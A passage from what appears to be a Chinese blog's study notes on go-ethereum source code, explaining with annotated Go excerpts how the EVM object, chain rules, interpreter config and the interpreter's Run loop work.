class="string">`json:&quot;istanbulBlock,omitempty&quot;`</span>       <span class="comment">// Istanbul switch block (nil = no fork, 0 = already on istanbul)</span></span><br><span class="line">	MuirGlacierBlock    *big.Int <span class="string">`json:&quot;muirGlacierBlock,omitempty&quot;`</span>    <span class="comment">// Eip-2384 (bomb delay) switch block (nil = no fork, 0 = already activated)</span></span><br><span class="line">	BerlinBlock         *big.Int <span class="string">`json:&quot;berlinBlock,omitempty&quot;`</span>         <span class="comment">// Berlin switch block (nil = no fork, 0 = already on berlin)</span></span><br><span class="line">	LondonBlock         *big.Int <span class="string">`json:&quot;londonBlock,omitempty&quot;`</span>         <span class="comment">// London switch block (nil = no fork, 0 = already on london)</span></span><br><span class="line">	ArrowGlacierBlock   *big.Int <span class="string">`json:&quot;arrowGlacierBlock,omitempty&quot;`</span>   <span class="comment">// Eip-4345 (bomb delay) switch block (nil = no fork, 0 = already activated)</span></span><br><span class="line">	GrayGlacierBlock    *big.Int <span class="string">`json:&quot;grayGlacierBlock,omitempty&quot;`</span>    <span class="comment">// Eip-5133 (bomb delay) switch block (nil = no fork, 0 = already activated)</span></span><br><span class="line">	MergeNetsplitBlock  *big.Int <span class="string">`json:&quot;mergeNetsplitBlock,omitempty&quot;`</span>  <span class="comment">// Virtual fork after The Merge to use as a network splitter</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// TerminalTotalDifficulty is the amount of total difficulty reached by</span></span><br><span class="line">	<span class="comment">// the network that triggers the consensus upgrade.</span></span><br><span class="line">	TerminalTotalDifficulty *big.Int <span class="string">`json:&quot;terminalTotalDifficulty,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Various consensus engines</span></span><br><span class="line">	Ethash *EthashConfig <span class="string">`json:&quot;ethash,omitempty&quot;`</span></span><br><span class="line">	Clique *CliqueConfig <span class="string">`json:&quot;clique,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="chainRules-链规则">chainRules 链规则:</h2>
<figure class="highlight go"><figcaption><span>params/config.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Rules ensures c&#x27;s ChainID is not nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ChainConfig)</span></span> Rules(num *big.Int, isMerge <span class="type">bool</span>) Rules &#123;</span><br><span class="line">	chainID := c.ChainID</span><br><span class="line">	<span class="keyword">if</span> chainID == <span class="literal">nil</span> &#123;</span><br><span class="line">		chainID = <span class="built_in">new</span>(big.Int)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Rules&#123;</span><br><span class="line">		ChainID:          <span class="built_in">new</span>(big.Int).Set(chainID),</span><br><span class="line">		IsHomestead:      c.IsHomestead(num),</span><br><span class="line">		IsEIP150:         c.IsEIP150(num),</span><br><span class="line">		IsEIP155:         c.IsEIP155(num),</span><br><span class="line">		IsEIP158:         c.IsEIP158(num),</span><br><span class="line">		IsByzantium:      c.IsByzantium(num),</span><br><span class="line">		IsConstantinople: c.IsConstantinople(num),</span><br><span class="line">		IsPetersburg:     c.IsPetersburg(num),</span><br><span class="line">		IsIstanbul:       c.IsIstanbul(num),</span><br><span class="line">		IsBerlin:         c.IsBerlin(num),</span><br><span class="line">		IsLondon:         c.IsLondon(num),</span><br><span class="line">		IsMerge:          isMerge,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回<code>chainConfig</code>里属性的布尔值</p>
<h2 id="Config-解释器配置信息">Config 解释器配置信息:</h2>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Config are the configuration options for the Interpreter</span></span><br><span class="line"><span class="comment">// 解释器配置类</span></span><br><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">	Debug                   <span class="type">bool</span>      <span class="comment">// Enables debugging	// 启用调试</span></span><br><span class="line">	Tracer                  EVMLogger <span class="comment">// Opcode logger  // 操作码记录器</span></span><br><span class="line">	NoBaseFee               <span class="type">bool</span>      <span class="comment">// Forces the EIP-1559 baseFee to 0 (needed for 0 price calls)</span></span><br><span class="line">	EnablePreimageRecording <span class="type">bool</span>      <span class="comment">// Enables recording of SHA3/keccak preimages // 启用SHA3/keccak</span></span><br><span class="line"></span><br><span class="line">	JumpTable *JumpTable <span class="comment">// EVM instruction table, automatically populated if unset // 操作码opcode对应的操作表</span></span><br><span class="line"></span><br><span class="line">	ExtraEips []<span class="type">int</span> <span class="comment">// Additional EIPS that are to be enabled</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较重要的属性是<code>JumpTable</code>操作码opcode对应的操作表</p>
<h1>创建EVM函数:</h1>
<figure class="highlight go"><figcaption><span>core/vm/evm.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEVM</span><span class="params">(blockCtx BlockContext, txCtx TxContext, statedb StateDB, chainConfig *params.ChainConfig, config Config)</span></span> *EVM &#123;</span><br><span class="line">	evm := &amp;EVM&#123;</span><br><span class="line">		Context:     blockCtx,</span><br><span class="line">		TxContext:   txCtx,</span><br><span class="line">		StateDB:     statedb,</span><br><span class="line">		Config:      config,</span><br><span class="line">		chainConfig: chainConfig,</span><br><span class="line">		chainRules:  chainConfig.Rules(blockCtx.BlockNumber, blockCtx.Random != <span class="literal">nil</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建EVM解释器</span></span><br><span class="line">	evm.interpreter = NewEVMInterpreter(evm, config)</span><br><span class="line">	<span class="keyword">return</span> evm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>NewEVM()</code> 函数用来创建一个新的虚拟机对象，它有5个参数，含义分别如下：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>blockCtx</code>: 区块的信息和挖矿环境的函数和数据</p>
</li>
<li class="lvl-2">
<p><code>txCtx</code>: 交易的信息</p>
</li>
<li class="lvl-2">
<p><code>statedb</code>: 以太坊状态数据库对象</p>
</li>
<li class="lvl-2">
<p><code>chainConfig</code>: 当前节点的区块链配置信息</p>
</li>
<li class="lvl-2">
<p><code>config</code>: 虚拟机配置信息</p>
</li>
</ul>
<p><code>NewEVM()</code> 函数的实现，除了把参数记录下来以外，主要就是调用 <code>NewEVMInterpreter()</code> 创建一个解释器对象。</p>
<p>后面另外介绍 EVM的解释器对象</p>
<h1>小结：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>以太坊在每处理一笔交易时，都会新建一个 EVM 对象来处理。</strong></p>
</li>
<li class="lvl-2">
<p>创建一个EVM对象需要依赖以下信息：</p>
<ul class="lvl-2">
<li class="lvl-4"><code>BlockContext</code>: 区块相关信息</li>
<li class="lvl-4"><code>TxContext</code>: 交易相关信息</li>
<li class="lvl-4"><code>chainConfig</code>:链配置信息</li>
<li class="lvl-4"><code>chainRules</code>:链规则</li>
<li class="lvl-4"><code>Config</code>:虚拟机解释器配置信息</li>
<li class="lvl-4"><code>interpreter</code>:EVM 解释器</li>
</ul>
</li>
<li class="lvl-2">
<p>需要记录以下信息：</p>
<ul class="lvl-2">
<li class="lvl-4"><code>depth</code>: 记录当前调用的栈的深度</li>
<li class="lvl-4"><code>abort</code>: 用于中止EVM调用操作</li>
<li class="lvl-4"><code>callGasTemp</code>: 当前call可用的gas</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-以太坊源码分析-EVM解释器对象</title>
    <url>/2022/3950.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>每处理一笔交易，就要新建一个 <code>EVM对象</code> 来处理交易。<br />
EVM 对象内部主要依赖三个对象：</p>
<ul class="lvl-0">
<li class="lvl-2">解释器 <code>Interpreter</code></li>
<li class="lvl-2">虚拟机相关配置对象 <code>vm.Config</code></li>
<li class="lvl-2">以太坊状态数据库 <code>StateDB</code></li>
</ul>
<p>这次先看<code>解释器对象</code>的源码</p>
<h1>EVM解释器对象：</h1>
<p>解释器对象<code>EVMInterpreter</code> 用来解释执行指定的合约指令。<br />
不过需要说明一点的是，实际的指令解释执行并不真正由解释器对象完成的，而是由 <code>vm.Config.JumpTable</code> 中的 operation 对象完成的，<br />
解释器对象只是负责逐条解析指令码，然后获取相应的 <code>operation</code> 对象，并在调用真正解释指令的 <code>operation.execute</code> 函数之前检查堆栈等对象。</p>
<p>也可以说，<strong>解释器对象只是负责解释的调度工作</strong>。</p>
<h1>创建EVM解释器对象：</h1>
<p><code>NewEVMInterpreter()</code>函数的主要操作:</p>
<ol>
<li class="lvl-3">
<p>根据不同的以太坊版本，使用不同对象填充<code>cfg.JumpTable</code>字段</p>
</li>
<li class="lvl-3">
<p>填充<code>cfg.ExtraEips</code>字段</p>
</li>
<li class="lvl-3">
<p>生成一个 <code>EVMInterpreter</code> 对象并返回</p>
</li>
</ol>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// NewEVMInterpreter returns a new instance of the Interpreter.</span></span><br><span class="line"><span class="comment">// 创建解释器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewEVMInterpreter</span><span class="params">(evm *EVM, cfg Config)</span></span> *EVMInterpreter &#123;</span><br><span class="line">	<span class="comment">// If jump table was not initialised we set the default one.</span></span><br><span class="line">	<span class="comment">// 在这里设置 操作码对应的函数 </span></span><br><span class="line">	<span class="comment">// 主要原因是以太坊经历版本迭代之后 操作码有了一些变化</span></span><br><span class="line">	<span class="comment">// 我们移植的时候 这个地方只会保留最新版本的操作码表</span></span><br><span class="line">	<span class="keyword">if</span> cfg.JumpTable == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> &#123;</span><br><span class="line">		<span class="comment">// 根据不同的以太坊版本，使用不同对象填充cfg.JumpTable字段</span></span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsMerge:</span><br><span class="line">			cfg.JumpTable = &amp;mergeInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsLondon:</span><br><span class="line">			cfg.JumpTable = &amp;londonInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsBerlin:</span><br><span class="line">			cfg.JumpTable = &amp;berlinInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsIstanbul:</span><br><span class="line">			cfg.JumpTable = &amp;istanbulInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsConstantinople:</span><br><span class="line">			cfg.JumpTable = &amp;constantinopleInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsByzantium:</span><br><span class="line">			cfg.JumpTable = &amp;byzantiumInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsEIP158:</span><br><span class="line">			cfg.JumpTable = &amp;spuriousDragonInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsEIP150:</span><br><span class="line">			cfg.JumpTable = &amp;tangerineWhistleInstructionSet</span><br><span class="line">		<span class="keyword">case</span> evm.chainRules.IsHomestead:</span><br><span class="line">			cfg.JumpTable = &amp;homesteadInstructionSet</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			cfg.JumpTable = &amp;frontierInstructionSet</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> i, eip := <span class="keyword">range</span> cfg.ExtraEips &#123;</span><br><span class="line">			<span class="built_in">copy</span> := *cfg.JumpTable</span><br><span class="line">			<span class="keyword">if</span> err := EnableEIP(eip, &amp;<span class="built_in">copy</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="comment">// Disable it, so caller can check if it&#x27;s activated or not</span></span><br><span class="line">				<span class="comment">// 填充cfg.ExtraEips字段</span></span><br><span class="line">				cfg.ExtraEips = <span class="built_in">append</span>(cfg.ExtraEips[:i], cfg.ExtraEips[i+<span class="number">1</span>:]...)</span><br><span class="line">				log.Error(<span class="string">&quot;EIP activation failed&quot;</span>, <span class="string">&quot;eip&quot;</span>, eip, <span class="string">&quot;error&quot;</span>, err)</span><br><span class="line">			&#125;</span><br><span class="line">			cfg.JumpTable = &amp;<span class="built_in">copy</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;EVMInterpreter&#123;</span><br><span class="line">		evm: evm,</span><br><span class="line">		cfg: cfg,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>EVMInterpreter</code> 关键方法是 <code>Run</code> 方法</p>
<h1>Interpreter.Run():</h1>
<h2 id="初始化执行循环中的中间变量">初始化执行循环中的中间变量:</h2>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// Increment the call depth which is restricted to 1024</span></span><br><span class="line"><span class="comment">// 调用深度递增，evm执行栈的深度不能超过1024</span></span><br><span class="line">in.evm.depth++</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; in.evm.depth-- &#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure the readOnly is only set if we aren&#x27;t in readOnly yet.</span></span><br><span class="line"><span class="comment">// This also makes sure that the readOnly flag isn&#x27;t removed for child calls.</span></span><br><span class="line"><span class="comment">// 将readOnly设置为true</span></span><br><span class="line"><span class="keyword">if</span> readOnly &amp;&amp; !in.readOnly &#123;</span><br><span class="line">	in.readOnly = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; in.readOnly = <span class="literal">false</span> &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reset the previous call&#x27;s return data. It&#x27;s unimportant to preserve the old buffer</span></span><br><span class="line"><span class="comment">// as every returning call will return new data anyway.</span></span><br><span class="line"><span class="comment">// 重置上一个call的返回数据 保留旧的缓冲区是不重要的,因为每个有返回的调用都会返回新数据。</span></span><br><span class="line">in.returnData = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Don&#x27;t bother with the execution if there&#x27;s no code.</span></span><br><span class="line"><span class="comment">// 如果合约代码为空则直接退出</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(contract.Code) == <span class="number">0</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	op          OpCode        <span class="comment">// current opcode // 当前的指令集</span></span><br><span class="line">	mem         = NewMemory() <span class="comment">// bound memory // 新建内存</span></span><br><span class="line">	stack       = newstack()  <span class="comment">// local stack // 新建堆栈</span></span><br><span class="line">	callContext = &amp;ScopeContext&#123;</span><br><span class="line">		Memory:   mem,</span><br><span class="line">		Stack:    stack,</span><br><span class="line">		Contract: contract,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// For optimisation reason we&#x27;re using uint64 as the program counter.</span></span><br><span class="line">	<span class="comment">// It&#x27;s theoretically possible to go above 2^64. The YP defines the PC</span></span><br><span class="line">	<span class="comment">// to be uint256. Practically much less so feasible.</span></span><br><span class="line">	pc   = <span class="type">uint64</span>(<span class="number">0</span>) <span class="comment">// program counter // 重置计数器</span></span><br><span class="line">	cost <span class="type">uint64</span></span><br><span class="line">	<span class="comment">// copies used by tracer</span></span><br><span class="line">	pcCopy  <span class="type">uint64</span> <span class="comment">// needed for the deferred EVMLogger</span></span><br><span class="line">	gasCopy <span class="type">uint64</span> <span class="comment">// for EVMLogger to log gas remaining before execution</span></span><br><span class="line">	logged  <span class="type">bool</span>   <span class="comment">// deferred EVMLogger should ignore already logged steps</span></span><br><span class="line">	res     []<span class="type">byte</span> <span class="comment">// result of the opcode execution function</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// Don&#x27;t move this deferred function, it&#x27;s placed before the capturestate-deferred method,</span></span><br><span class="line"><span class="comment">// so that it get&#x27;s executed _after_: the capturestate needs the stacks before</span></span><br><span class="line"><span class="comment">// they are returned to the pools</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">	returnStack(stack)</span><br><span class="line">&#125;()</span><br><span class="line">contract.Input = input</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> in.cfg.Debug &#123;</span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> !logged &#123;</span><br><span class="line">				in.cfg.Tracer.CaptureState(pcCopy, op, gasCopy, cost, callContext, in.returnData, in.evm.depth, err)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				in.cfg.Tracer.CaptureFault(pcCopy, op, gasCopy, cost, callContext, in.evm.depth, err)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="进入主循环">进入主循环:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>根据<code>pc</code>获取一条指令</p>
</li>
<li class="lvl-2">
<p>根据指令从<code>JumpTable</code>中获得操作码</p>
</li>
<li class="lvl-2">
<p>检查堆栈上的参数 是否服符合操作码函数的要求</p>
</li>
<li class="lvl-2">
<p>计算指令所需要的内存大小</p>
</li>
<li class="lvl-2">
<p>获取这个指令需要gas消耗，然后从交易余额中扣除当前指令的消耗，如果余额不足，直接返回<code>ErrOutOfGas</code></p>
</li>
<li class="lvl-2">
<p>计算新的内存大小以动态调整内存大小，必要时进行扩容(按32字节)</p>
</li>
<li class="lvl-2">
<p>所有使用动态内存的操作码都有动态的gas成本，扣除动态gas成本，如果不够，就返回<code>ErrOutOfGas</code>错误</p>
</li>
<li class="lvl-2">
<p>执行操作指令</p>
</li>
<li class="lvl-2">
<p>处理操作指令的返回值</p>
</li>
</ul>
<figure class="highlight go"><figcaption><span>core/vm/interpreter.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// The Interpreter main run loop (contextual). This loop runs until either an</span></span><br><span class="line"><span class="comment">// explicit STOP, RETURN or SELFDESTRUCT is executed, an error occurred during</span></span><br><span class="line"><span class="comment">// the execution of one of the operations or until the done flag is set by the</span></span><br><span class="line"><span class="comment">// parent context.</span></span><br><span class="line"><span class="comment">// 解释器主循环，循环运行直到执行显式STOP，RETURN或SELFDESTRUCT指令被执行，或者是遇到任意错误，或者说done标志被父context设置</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> in.cfg.Debug &#123;</span><br><span class="line">		<span class="comment">// Capture pre-execution values for tracing.</span></span><br><span class="line">		<span class="comment">// 捕获预执行的值进行跟踪</span></span><br><span class="line">		logged, pcCopy, gasCopy = <span class="literal">false</span>, pc, contract.Gas</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Get the operation from the jump table and validate the stack to ensure there are</span></span><br><span class="line">	<span class="comment">// enough stack items available to perform the operation.</span></span><br><span class="line">	<span class="comment">// 从合约的二进制数据i获取第pc个opcode操作符</span></span><br><span class="line">	<span class="comment">// opcode是以太坊虚拟机指令，一共不超过256个，正好一个byte大小能装下</span></span><br><span class="line">	<span class="comment">// 根据pc获取一条指令</span></span><br><span class="line">	op = contract.GetOp(pc)</span><br><span class="line">	<span class="comment">// 根据指令从JumpTable中获得操作码</span></span><br><span class="line">	operation := in.cfg.JumpTable[op]</span><br><span class="line">	<span class="comment">// 获取这个指令需要gas消耗</span></span><br><span class="line">	cost = operation.constantGas <span class="comment">// For tracing</span></span><br><span class="line">	<span class="comment">// Validate stack 检查堆栈</span></span><br><span class="line">	<span class="comment">// 检查：检查堆栈上的参数是否符合指令函数的要求</span></span><br><span class="line">	<span class="keyword">if</span> sLen := stack.<span class="built_in">len</span>(); sLen &lt; operation.minStack &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, &amp;ErrStackUnderflow&#123;stackLen: sLen, required: operation.minStack&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> sLen &gt; operation.maxStack &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, &amp;ErrStackOverflow&#123;stackLen: sLen, limit: operation.maxStack&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 扣除当前指令的消耗</span></span><br><span class="line">	<span class="keyword">if</span> !contract.UseGas(cost) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, ErrOutOfGas</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> operation.dynamicGas != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// All ops with a dynamic memory usage also has a dynamic gas cost.</span></span><br><span class="line">		<span class="comment">// 所有使用动态内存的操作码都有动态的gas成本。</span></span><br><span class="line">		<span class="keyword">var</span> memorySize <span class="type">uint64</span></span><br><span class="line">		<span class="comment">// calculate the new memory size and expand the memory to fit</span></span><br><span class="line">		<span class="comment">// the operation</span></span><br><span class="line">		<span class="comment">// 计算新的内存大小以适应操作，必要时进行扩容</span></span><br><span class="line">		<span class="comment">// Memory check needs to be done prior to evaluating the dynamic gas portion,</span></span><br><span class="line">		<span class="comment">// to detect calculation overflows</span></span><br><span class="line">		<span class="comment">// 在评估动态气体部分之前需要进行内存检查，检测计算溢出</span></span><br><span class="line">		<span class="keyword">if</span> operation.memorySize != <span class="literal">nil</span> &#123; <span class="comment">// 计算内存使用量，先判断内存大小是否足够</span></span><br><span class="line">			memSize, overflow := operation.memorySize(stack)</span><br><span class="line">			<span class="keyword">if</span> overflow &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span>, ErrGasUintOverflow</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// memory is expanded in words of 32 bytes. Gas</span></span><br><span class="line">			<span class="comment">// is also calculated in words.</span></span><br><span class="line">			<span class="comment">// 扩容按32字节的字扩展</span></span><br><span class="line">			<span class="keyword">if</span> memorySize, overflow = math.SafeMul(toWordSize(memSize), <span class="number">32</span>); overflow &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span>, ErrGasUintOverflow</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Consume the gas and return an error if not enough gas is available.</span></span><br><span class="line">		<span class="comment">// cost is explicitly set so that the capture state defer method can get the proper cost</span></span><br><span class="line">		<span class="comment">// 计算执行操作所需要的gas</span></span><br><span class="line">		<span class="comment">// 计算gas的Cost 并使用，如果不够，就返回OutOfGas错误。</span></span><br><span class="line">		<span class="keyword">var</span> dynamicCost <span class="type">uint64</span></span><br><span class="line">		dynamicCost, err = operation.dynamicGas(in.evm, contract, stack, mem, memorySize)</span><br><span class="line">		cost += dynamicCost <span class="comment">// for tracing</span></span><br><span class="line">		<span class="comment">// 扣除gas</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> || !contract.UseGas(dynamicCost) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, ErrOutOfGas</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Do tracing before memory expansion</span></span><br><span class="line">		<span class="keyword">if</span> in.cfg.Debug &#123;</span><br><span class="line">			in.cfg.Tracer.CaptureState(pc, op, gasCopy, cost, callContext, in.returnData, in.evm.depth, err)</span><br><span class="line">			logged = <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> memorySize &gt; <span class="number">0</span> &#123;  <span class="comment">//扩大内存范围</span></span><br><span class="line">			mem.Resize(memorySize)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> in.cfg.Debug &#123;</span><br><span class="line">		in.cfg.Tracer.CaptureState(pc, op, gasCopy, cost, callContext, in.returnData, in.evm.depth, err)</span><br><span class="line">		logged = <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// execute the operation</span></span><br><span class="line">	<span class="comment">// 执行操作</span></span><br><span class="line">	res, err = operation.execute(&amp;pc, in, callContext)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">	pc++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err == errStopToken &#123;</span><br><span class="line">	err = <span class="literal">nil</span> <span class="comment">// clear stop token error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总体来说，解释器执行循环的过程如下图：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220722104219.png" alt="20220722104219" /></p>
<h1>EVM指令与操作:</h1>
<p>我们先看下EVM模块的代码结构：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> evm.<span class="property">go</span>	        		  <span class="comment">// 定义了EVM运行环境结构体，并实现 转账处理 这些比较高级的，跟交易本身有关的功能 </span></span><br><span class="line">└── vm</span><br><span class="line">    ├── analysis.<span class="property">go</span>      <span class="comment">// 跳转目标判断</span></span><br><span class="line">    ├── common.<span class="property">go</span>		 <span class="comment">// 一些共有方法</span></span><br><span class="line">    ├── contract.<span class="property">go</span>		 <span class="comment">// 智能合约</span></span><br><span class="line">    ├── contracts.<span class="property">go</span></span><br><span class="line">    ├── doc.<span class="property">go</span></span><br><span class="line">    ├── eips.<span class="property">go</span></span><br><span class="line">    ├── errors.<span class="property">go</span>		 <span class="comment">// 错误类</span></span><br><span class="line">    ├── evm.<span class="property">go</span>           <span class="comment">// evm对外接口,定义了EVM结构体，提供Create和Call方法，作为虚拟机的入口，分别对应创建合约和执行合约代码</span></span><br><span class="line">    ├── gas.<span class="property">go</span>			 <span class="comment">// gas花费计算</span></span><br><span class="line">    ├── gas_table.<span class="property">go</span>     <span class="comment">// 绝大部分操作码所需的gas计算表</span></span><br><span class="line">    ├── instructions.<span class="property">go</span>  <span class="comment">// 绝大部分的操作码对应的实现都在这里  </span></span><br><span class="line">    ├── interface.<span class="property">go</span></span><br><span class="line">    ├── interpreter.<span class="property">go</span>   <span class="comment">// 虚拟机的调度器，开始真正的解析执行合约代码</span></span><br><span class="line">    ├── jump_table.<span class="property">go</span>	 <span class="comment">// 定义了operation，就是将opcode和gas计算函数、具体实现函数等关联起来</span></span><br><span class="line">    ├── logger.<span class="property">go</span>		 <span class="comment">// evm日志</span></span><br><span class="line">    ├── memory.<span class="property">go</span>		 <span class="comment">// evm的内存结构</span></span><br><span class="line">    ├── memory_table.<span class="property">go</span></span><br><span class="line">    ├── opcodes.<span class="property">go</span>       <span class="comment">// op指令集</span></span><br><span class="line">    ├── operations_acl.<span class="property">go</span></span><br><span class="line">    ├── runtime</span><br><span class="line">    │   ├── doc.<span class="property">go</span></span><br><span class="line">    │   ├── env.<span class="property">go</span>		  <span class="comment">// 执行环境</span></span><br><span class="line">    │   ├── runtime.<span class="property">go</span>	  <span class="comment">// 运行时</span></span><br><span class="line">    ├── stack.<span class="property">go</span>		  <span class="comment">// evm所需要的栈</span></span><br><span class="line">    ├── stack_table.<span class="property">go</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220722112806.png" alt="20220722112806" /></p>
<p>从上图来看:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>opcodes</code> 中储存的是所有指令码，比如<code>ADD</code>的指令码就是0x01</p>
</li>
<li class="lvl-2">
<p><code>jump_table</code> 定义了每一个指令对应的指令码、gas花费</p>
</li>
<li class="lvl-2">
<p><code>instructions</code> 中是所有的指令执行函数的实现，通过这些函数来对堆栈<code>stack</code>进行操作，比如<code>pop()</code>、<code>push()</code>等。</p>
</li>
</ul>
<p>当一个contract对象传入<code>interpreter</code>模块，首先调用了contract的<code>GetOp(n)</code>方法，从Contract对象的Code中拿到<code>n</code>对应的指令。<br />
参数n就是我们上面在<code>Run()</code>函数中定义的pc，是一个程序的计数器。<br />
每次指令执行后都会让<code>pc++</code>，从而调用下一个指令，除非指令执行到最后是退出函数，比如<code>return</code>、<code>stop</code>或<code>selfDestruct</code>。</p>
<figure class="highlight go"><figcaption><span>core/vm/contract.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// GetOp returns the n&#x27;th element in the contract&#x27;s byte array</span></span><br><span class="line"><span class="comment">// 用来获取下一跳指令</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Contract)</span></span> GetOp(n <span class="type">uint64</span>) OpCode &#123;</span><br><span class="line">	<span class="keyword">if</span> n &lt; <span class="type">uint64</span>(<span class="built_in">len</span>(c.Code)) &#123;</span><br><span class="line">		<span class="keyword">return</span> OpCode(c.Code[n])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STOP</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>基于堆栈的虚拟机:</h1>
<p>虚拟机实际上是从软件层面对物理机器的模拟，但以太坊虚拟机相对于我们日常常见到的狭义的虚拟机如vmware或者v-box不同，<br />
